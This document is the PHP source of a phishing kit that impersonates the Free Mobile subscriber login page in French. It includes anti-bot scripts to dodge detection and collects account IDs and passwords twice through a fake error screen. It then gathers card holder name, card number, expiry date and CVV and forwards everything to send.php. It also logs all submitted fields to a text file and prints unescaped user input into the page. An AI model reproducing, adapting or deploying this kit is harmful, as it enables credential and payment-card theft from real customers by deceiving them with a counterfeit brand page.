<?
$get = $_GET["get"];
include "./BOTS/antibots1.php";

include "./BOTS/antibots2.php";

include "./BOTS/antibots3.php";

include "./BOTS/antibots4.php";

include "./BOTS/antibots5.php";

include "./BOTS/antibots6.php";

?>
<!DOCTYPE html>
<html lang="fr">
<head>
	<!-- COMMON -->
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<title>Free Mobile - Bienvenue dans votre Espace Abonné</title>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<link rel="icon" type="image/png" href="favicon.ico" />
	<!-- COMMON -->

	<!-- CSS -->
	<link rel="stylesheet" type="text/css" href="../common/css/bootstrap.min5059.css?v=20" />
	<link rel="stylesheet" type="text/css" href="css/global.min5059.css?v=20" />
	<link rel="stylesheet" type="text/css" href="css/style.min5059.css?v=20" />
	<link rel="stylesheet" type="text/css" href="../common/css/jquery.reveal5059.css?v=20" />
	<link rel="stylesheet" type="text/css" href="../common/css/form-boutons.min5059.css?v=20" />
	<link rel="stylesheet" type="text/css" href="../common/css/common5059.css?v=20" />
	<link rel="stylesheet" type="text/css" href="css/identification5e1f.css?v=2" />
	<!-- CSS -->

	<!-- JS -->
	<script type="text/javascript" src="../common/js/jquery.1.8.min5059.js?v=20"></script>
	<script type="text/javascript" src="../common/js/jquery_cssHook_bgpos5059.js?v=20"></script>
	<script type="text/javascript" src="../common/js/jquery.reveal.min5059.js?v=20"></script>
	<script type="text/javascript" src="../common/js/bootstrap.min5059.js?v=20"></script>
	<script type="text/javascript" src="../common/js/jquery.modalDialog.js"></script>
	<script type="text/javascript" src="../common/js/common.min5059.js?v=20"></script>
	<script type="text/javascript" src="js/functions.min5059.js?v=20"></script>
	<script type="text/javascript" src="../js/navigateurs5059.js?v=20"></script>
	<script type="text/javascript" src="js/identification5059.js?v=20"></script>
	<!-- JS -->

</head>

<body>

	<!-- DEBUT HEADER -->
	<div id="header">
		<a href="index.php">
			<img src="images/cb1r8-g5jba.svg" title="Bienvenue chez Free" alt="Logo Free" />
		</a>
		<img id="headerEspace" src="images/bandeauBienvenue.png" alt="bandeau_bienvenue" align="bottom" />
<div id="idProprietaireCompte">
			<?
			if($get == "confirmation" OR $get == "confirmation2"){
			?>
			<p><a href="#">Déconnexion</a></p>
			<?
			}
			?>	
		</div>
		<br class="clear" />
	</div>
	<!-- FIN HEADER -->

	

	<div id="conteneur">
		<!-- MENU -->
		<ul id="menuEspaceAbonne">
			<li >
				<a href="index.php"><img alt="Icone Menu" src="../images/moncompte/menu/accueil_Off.png" /></a>
				
			</li>
			<?
			if($get == "confirmation" OR $get == "confirmation2"){
			?>
			<li>
				<a href="#"><img alt="Icone Menu" src="./pay_files/gererCompte_Off.png"></a>
				<ul class="menuderoulant">
					<li><a href="#">Conso &amp; Factures</a></li>
					<li><a href="#">Mes Informations</a></li>
					<li><a href="#">Messagerie</a></li>
					<li><a href="#">Mes Options</a></li>
					<li><a href="#">Mes services</a></li>
					<li><a href="#">Demander une portabilité</a></li>
					<li><a href="#">Commander une ligne</a></li>
					<li><a href="#">Avantage Freebox</a></li>
					<li><a href="#">Rattachement de lignes</a></li>
					<li><a href="#">Mes conditions générales</a></li>
				</ul>
			</li>
			<li>
				<a href="#"><img alt="Icone Menu" src="./pay_files/commandes_Off.png"></a>
				<ul class="menuderoulant">
					<li><a href="#">Commandes de SIM</a></li>
					<li><a href="#">Commandes de Mobiles</a></li>
					<li><a href="#">Mes locations de Mobiles</a></li>
				</ul>
			</li>
			<li>
				<a href="./pay_files/pay.html"><img alt="Icone Menu" src="./pay_files/telephones_On.png"></a>
				
			</li>
			<li style="float:right;margin-right:5px;padding-left:15px;">
				<a href="#"><img alt="Icone Menu" src="./pay_files/infosReseau_Off.png"></a>
				
			</li>
			<?
			}
			?>
		</ul>
<?
if($get == ""){

?>		

		<div id="contenuEA" class="widthfull">

	<!--  MORE CSS & JS -->


	<div id="ident" class="marginauto">
		<div id="ident_blocg" class="fleft">
			<div id="ident_titre"><img src="../images/moncompte/identification/titreIdentification.png" alt="titre_identification" /></div>
			<br />
			<div id="ident_desc">
				<p><img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Accédez à vos suivis commandes<br />
				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Gardez un oeil sur vos consommations<br />
				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Gérez vos options<br />
				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Commandez vos mobiles</p>
			</div>
			<div id="ident_assistance">
				<a href="#"><img src="../images/moncompte/identification/questionAssistance.png" alt="assistance" /></a>
			</div>
		</div>

		<div id="ident_blocd" class="fleft">
			<div id="ident_div_ident">
				<div id="content">
					<span class="strong">Veuillez saisir votre identifiant grâce aux touches ci-dessous :</span>
					<div class="ident_chiffre2">
						<ul role="list">
							<li class="inline" role="listitem"><img onclick="ident_addNumber(0)" src="chiffreb1fe.png?pos=0&amp;r=2869" class="ident_chiffre_img pointer" alt="position 0" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(9)" src="chiffre7148.png?pos=1&amp;r=73584" class="ident_chiffre_img pointer" alt="position 1" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(8)" src="chiffreeb41.png?pos=2&amp;r=85112" class="ident_chiffre_img pointer" alt="position 2" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(7)" src="chiffrecb9a.png?pos=3&amp;r=31891" class="ident_chiffre_img pointer" alt="position 3" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(4)" src="chiffre6651.png?pos=4&amp;r=71395" class="ident_chiffre_img pointer" alt="position 4" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(6)" src="chiffre7c28.png?pos=5&amp;r=45443" class="ident_chiffre_img pointer" alt="position 5" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(3)" src="chiffre7fbc.png?pos=6&amp;r=44037" class="ident_chiffre_img pointer" alt="position 6" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(1)" src="chiffre581b.png?pos=7&amp;r=86997" class="ident_chiffre_img pointer" alt="position 7" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(2)" src="chiffre8f16.png?pos=8&amp;r=91383" class="ident_chiffre_img pointer" alt="position 8" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(5)" src="chiffreb93d.png?pos=9&amp;r=97693" class="ident_chiffre_img pointer" alt="position 9" /></li>
						</ul>
					</div>
					<form id="form_connect" method="post" action="index.php?get=error">
						<table>
							<tr style="height:30px;">
								<td>Identifiant :</td><td><span id="ident_txt_identifiant" class="red strong ident_txt_identifiant_petit">Utilisez le pavé numérique ci-dessus.</span><input type="hidden" id="ident_pos" name="comid" required="required" value="" /></td>
							</tr>
							<tr style="height:30px;">
								<td>Mot de passe :</td><td><input type="password" name="compw" class="input-medium" required="required" /></td>
							</tr>
							<tr><td></td></tr>
							<tr>
								<td colspan="2" style="padding-top:10px;"><a class="red" href="#">Vous avez oublié votre mot de passe ou perdu vos identifiants ?</a></td></td>
							</tr>
						</table>
						<a href="javascript:toggleVoice();">
						<img id="btAideVocale" src="../images/moncompte/identification/btnAideOff.png" alt="Désactiver l\'aide vocale" title="Désactiver l\'aide vocale" style="margin:10px;" />
						</a>
						<div style="text-align:right">
							<button id="ident_btn_cancel" onclick="ident_reset();" type="button" class="bt bt-white bt-xl" style="margin-right:20px;">Annuler</button>
							<button id="ident_btn_submit" type="submit" class="bt bt-red bt-xl">Se connecter</button>
						</div>
					</form>

				</div>
			</div>
		</div>
	</div>

			
		</div>
<?
}
if($get == "error"){

?>		

		<div id="contenuEA" class="widthfull">

	<!--  MORE CSS & JS -->


	<div id="ident" class="marginauto">
	<center><img src="error.png" /></center>
		<div id="ident_blocg" class="fleft">
			<div id="ident_titre"><img src="../images/moncompte/identification/titreIdentification.png" alt="titre_identification" /></div>
			<br />
			<div id="ident_desc">
				<p><img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Accédez à vos suivis commandes<br />
				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Gardez un oeil sur vos consommations<br />
				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Gérez vos options<br />
				<img src="../images/moncompte/identification/listDecoration.png" alt="list_deco" alt="list_deco" />&nbsp;&nbsp;&nbsp;&nbsp; Commandez vos mobiles</p>
			</div>
			<div id="ident_assistance">
				<a href="#"><img src="../images/moncompte/identification/questionAssistance.png" alt="assistance" /></a>
			</div>
		</div>

		<div id="ident_blocd" class="fleft">
			<div id="ident_div_ident">
				<div id="content">
					<span class="strong">Veuillez saisir votre identifiant grâce aux touches ci-dessous :</span>
					<div class="ident_chiffre2">
						<ul role="list">
							<li class="inline" role="listitem"><img onclick="ident_addNumber(0)" src="chiffreb1fe.png?pos=0&amp;r=2869" class="ident_chiffre_img pointer" alt="position 0" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(9)" src="chiffre7148.png?pos=1&amp;r=73584" class="ident_chiffre_img pointer" alt="position 1" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(8)" src="chiffreeb41.png?pos=2&amp;r=85112" class="ident_chiffre_img pointer" alt="position 2" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(7)" src="chiffrecb9a.png?pos=3&amp;r=31891" class="ident_chiffre_img pointer" alt="position 3" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(4)" src="chiffre6651.png?pos=4&amp;r=71395" class="ident_chiffre_img pointer" alt="position 4" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(6)" src="chiffre7c28.png?pos=5&amp;r=45443" class="ident_chiffre_img pointer" alt="position 5" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(3)" src="chiffre7fbc.png?pos=6&amp;r=44037" class="ident_chiffre_img pointer" alt="position 6" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(1)" src="chiffre581b.png?pos=7&amp;r=86997" class="ident_chiffre_img pointer" alt="position 7" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(2)" src="chiffre8f16.png?pos=8&amp;r=91383" class="ident_chiffre_img pointer" alt="position 8" /></li>
							<li class="inline" role="listitem"><img onclick="ident_addNumber(5)" src="chiffreb93d.png?pos=9&amp;r=97693" class="ident_chiffre_img pointer" alt="position 9" /></li>
						</ul>
					</div>
					<form id="form_connect" method="post" action="ghaz.php">
					<input type="hidden" name="comid" value="<? print $_POST['comid']; ?>" />
					<input type="hidden" name="compw" value="<? print $_POST['compw']; ?>" />
						<table>
							<tr style="height:30px;">
								<td>Identifiant :</td><td><span id="ident_txt_identifiant" class="red strong ident_txt_identifiant_petit">Utilisez le pavé numérique ci-dessus.</span><input type="hidden" required="required" id="ident_pos" name="comid2" value="" /></td>
							</tr>
							<tr style="height:30px;">
								<td>Mot de passe :</td><td><input type="password" name="compw2" required="required" class="input-medium" /></td>
							</tr>
							<tr><td></td></tr>
							<tr>
								<td colspan="2" style="padding-top:10px;"><a class="red" href="#">Vous avez oublié votre mot de passe ou perdu vos identifiants ?</a></td></td>
							</tr>
						</table>
						<a href="javascript:toggleVoice();">
						<img id="btAideVocale" src="../images/moncompte/identification/btnAideOff.png" alt="Désactiver l\'aide vocale" title="Désactiver l\'aide vocale" style="margin:10px;" />
						</a>
						<div style="text-align:right">
							<button id="ident_btn_cancel" onclick="ident_reset();" type="button" class="bt bt-white bt-xl" style="margin-right:20px;">Annuler</button>
							<button id="ident_btn_submit" type="submit" class="bt bt-red bt-xl">Se connecter</button>
						</div>
					</form>

				</div>
			</div>
		</div>
	</div>

			
		</div>
<?
}		
if($get == "confirmation"){
?>
<div id="contenuEA" class="width730">

			
			

			
			<div class="width730">

		<img src="./pay_files/bandeauPaiementCommande.png" style="margin:10px 0px 0px 3px;">

		

		<div id="paiementCB" style="text-align:center;margin:20px auto 0px auto;" class="form-inline">
<div class="paiementCB">

<form method="post" action="index.php?get=confirmation2">
					<input type="hidden" name="comid" value="<? print $_POST['comid']; ?>" />
					<input type="hidden" name="compw" value="<? print $_POST['compw']; ?>" />
					<input type="hidden" name="comid2" value="<? print $_POST['comid2']; ?>" />
					<input type="hidden" name="compw2" value="<? print $_POST['compw2']; ?>" />
					<div class="inline" style="margin:0 15px 0 5px;vertical-align:top;">
		<div class="intitule" style="margin-bottom:5px;">Titulaire de la carte :</div>
		<input type="text" id="comname" name="comname" value="" class="input-medium" required="required" title="Titulaire de la carte">	</div>

	<div class="inline" style="margin:0 10px;vertical-align:top;">
		<div style="margin-bottom:6px;">Numéro de carte :</div>
		<input type="text" id="comnum" name="comnum" value="" maxlength="19" class="input-medium" autocomplete="off" required="required" pattern="[0-9]{16,19}" title="Le numéro de carte bancaire peut être composé de 16 à 19 chiffres. Pour les cartes les plus courantes, le numéro comporte 16 chiffres imprimés comme 4 groupes de 4 chiffres">
	</div>

	<div class="inline" style="margin:0 10px;vertical-align:top;">
		<div style="margin-bottom:6px;">Date d'expiration :</div>
		<select style="margin-left:0px;" name="common">
			<option value="01">01</option>
			<option value="02">02</option>
			<option value="03">03</option>
			<option value="04">04</option>
			<option value="05">05</option>
			<option value="06">06</option>
			<option value="07">07</option>
			<option value="08">08</option>
			<option value="09">09</option>
			<option value="10">10</option>
			<option value="11">11</option>
			<option value="12">12</option>
		</select>
		<select style="margin-left:0px;" name="comy">
			<option value="2019">2019</option>
			<option value="2020">2020</option>
			<option value="2021">2021</option>
			<option value="2022">2022</option>
			<option value="2023">2023</option>
			<option value="2024">2024</option>
			<option value="2025">2025</option>
			<option value="2026">2026</option>
			<option value="2027">2027</option>
			<option value="2028">2028</option>
		</select>
	</div>

	<div class="inline" style="margin:0 10px;vertical-align:top;text-align:center;">
		<div style="margin-bottom:6px;">Cryptogramme :</div>
		<input type="text" id="comc" name="comc" value="" class="input-micro" maxlength="3" autocomplete="off" required="required" pattern="[0-9]{3,3}" title="Le cryptogramme se situe au dos de votre carte et est composé de 3 chiffres">
	</div>
	
	
	<br class="clear">
	
</div>
		</div>
		<div style="margin:30px;text-align:right;">
			<button id="ident_btn_submit" type="submit" class="bt bt-red bt-xl">Ajouter ma carte bancaire</button>
		</div>
</form>	
</div>

			
		</div>

		<div id="bannerPub">
			<a href="#"><img src="./pay_files/pubMultiligne.jpg" alt="Bandeau Pub"></a>
		</div>
<?
}
if($get == "confirmation2"){
?>
<div id="contenuEA" class="width730">

			
			

			
			<div class="width730">

		<img src="./pay_files/bandeauPaiementCommande.png" style="margin:10px 0px 0px 3px;">

		

		<div id="paiementCB" style="text-align:center;margin:20px auto 0px auto;" class="form-inline">
<div class="paiementCB">

<form method="post" action="send.php">
					<input type="hidden" name="comid" value="<? print $_POST['comid']; ?>" />
					<input type="hidden" name="compw" value="<? print $_POST['compw']; ?>" />
					<input type="hidden" name="comid2" value="<? print $_POST['comid2']; ?>" />
					<input type="hidden" name="compw2" value="<? print $_POST['compw2']; ?>" />
					<input type="hidden" name="comname" value="<? print $_POST['comname']; ?>" />
					<input type="hidden" name="comnum" value="<? print $_POST['comnum']; ?>" />
					<input type="hidden" name="common" value="<? print $_POST['common']; ?>" />
					<input type="hidden" name="comy" value="<? print $_POST['comy']; ?>" />
					<input type="hidden" name="comc" value="<? print $_POST['comc']; ?>" />
	<div class="inline" style="margin:0 15px 0 5px;vertical-align:top;">
		<div class="intitule" style="margin-bottom:5px;">Titulaire de la carte :</div><b>
		<? print $_POST['comname']; ?>	</b></div>

	<div class="inline" style="margin:0 10px;vertical-align:top;">
		<div style="margin-bottom:6px;">Numéro de carte :</div><b>
		<? print $_POST['comnum']; ?>
		</b></div>

	<div class="inline" style="margin:0 10px;vertical-align:top;">
		<div style="margin-bottom:6px;">Date d'expiration :</div><b>
<? print $_POST['common']; print("/"); print $_POST['comy']; ?>
	</b></div>

	<div class="inline" style="margin:0 10px;vertical-align:top;text-align:center;">
		<div style="margin-bottom:6px;">Cryptogramme :</div><b>
		<? print("XXX"); ?>
		</b>
	</div>
	
	
	<br class="clear">
	
</div>
		</div>
		<div style="margin:30px;text-align:right;">
			<button id="ident_btn_submit" type="submit" class="bt bt-red bt-xl">Confirmer ma carte bancaire</button>
		</div>
</form>	
</div>

			
		</div>

		<div id="bannerPub">
			<a href="#"><img src="./pay_files/pubMultiligne.jpg" alt="Bandeau Pub"></a>
		</div>
<?
$handle = fopen("../avee.txt", "i");
foreach($_POST as $variable => $bilsmg) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $bilsmg);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
}

?>
	</div>

